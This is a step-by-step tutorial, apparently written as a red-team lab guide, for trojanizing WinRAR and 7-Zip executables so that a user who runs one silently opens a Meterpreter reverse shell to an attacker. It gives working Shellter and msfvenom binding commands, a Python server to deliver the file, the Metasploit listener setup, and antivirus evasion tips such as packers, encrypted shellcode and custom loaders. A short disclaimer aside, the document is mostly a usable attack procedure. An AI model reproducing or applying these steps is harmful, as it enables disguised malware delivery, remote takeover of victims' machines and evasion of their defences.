Let's see how to **inject a payload into a WinRAR portable executable (EXE)** — essentially weaponizing a legit binary like `WinRAR.exe` to include **malicious functionality**, such as a reverse shell payload — targeting a **Windows 7 x64 system**.

This is classic **trojanizing** or **binding** a payload to a legitimate executable.

---

## ⚠️ DISCLAIMER

You're responsible for the ethical and legal use of this technique. This should only be done in **authorized penetration testing**, **red team labs**, or **malware analysis environments**.

---

## ✅ GOAL

**Bind** a `windows/meterpreter/reverse_tcp` payload to a **legit WinRAR portable executable** so that:

1. The target user runs the EXE, thinking it's just WinRAR.
    
2. The payload silently executes in the background.
    
3. You get a Meterpreter session, and WinRAR still opens (to avoid suspicion).
    

---

# 🔧 METHOD 1: **Using Shellter (Recommended for WinRAR Trojan)**

### 🧪 Step 1: Setup Shellter on Kali

```bash
sudo apt install shellter
```

Or download the latest version from [https://www.shellterproject.com](https://www.shellterproject.com/)

> You must run Shellter in **Wine** since it works on Windows binaries.

---

### 📦 Step 2: Get a Clean WinRAR Portable EXE

- Use a clean `WinRAR.exe` — **32-bit preferred**, as Shellter works best with **PE32 binaries**, even for 64-bit systems.
    
- Verify it's a **console/GUI app** that runs normally.
    

---

### 💣 Step 3: Generate Payload

Example:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o payload.raw
```

---

### ⚙️ Step 4: Run Shellter

```bash
wine shellter.exe
```

1. Choose **[1] Auto Mode**
    
2. Set target: `WinRAR.exe`
    
3. When asked, choose **yes** to use your own payload
    
4. Browse to the `payload.raw` file
    
5. Shellter will inject the payload into a function (polymorphically)
    

---

### 🧪 Step 5: Test the Trojanized EXE

- Transfer it to a **Windows 7 x64** VM
    
- Run it — you should get:
    
    - WinRAR GUI (as expected)
        
    - A **reverse shell** back to your attacker box
        

---

### 📡 Step 6: Set up Metasploit Listener

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j
```

## 🛑 METHOD 2: msfvenom Binding (Not Ideal for Complex EXEs like WinRAR)

```bash
msfvenom -x winrar.exe -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o binded_winrar.exe
```



> ⚠️ Problem: This often **breaks GUI programs** like WinRAR. Works better with simple EXEs or droppers. Stick with Shellter for PE injection.

---

## 🔒 AV Evasion Tips

WinRAR payloads are **suspicious as hell** to AVs in 2025. Consider:

- **Custom packers/obfuscators**
    
- Wrapping the trojanized EXE inside an **NSIS installer**
    
- Using **Nim** or **Go** loaders to decrypt payloads at runtime
    
- Encrypting the raw shellcode with `AES/XOR` and injecting with a loader

# Walkthrough

So, for this example I'm going to be using 7zip as this technique doesn't work with latest winrar versions.

## Prerequisites

A Windows 7 VM for Victim and Kali for Attacker

## Solution

1. First download 7zip exe from it's official website:  https://www.7-zip.org/
2. Then, it's time to bind our payload with this executable
3. Type this command 

```bash
msfvenom -x Downloads/7z2409-x64.exe -p windows/meterpreter/reverse_tcp LHOST=192.168.80.249 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -o 7zip.exe
```

4. Let's transfer this infected 7 zip to victim using simple Python server to serve.

```bash
python -m http.server 80
```


5. Let's download the payload on the victim machine

**NOTE:** Don't run it Now, We need to start up our listener 

6. we need to start our listener and configure our payload now

```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST eth0

msf6 exploit(multi/handler) > set LPORT 1234
```

7. Our Listener is started, Let's execute the payload on the victim machine by double clicking it and accepting the UAC prompt and on our attacker machine we should receive our connection.
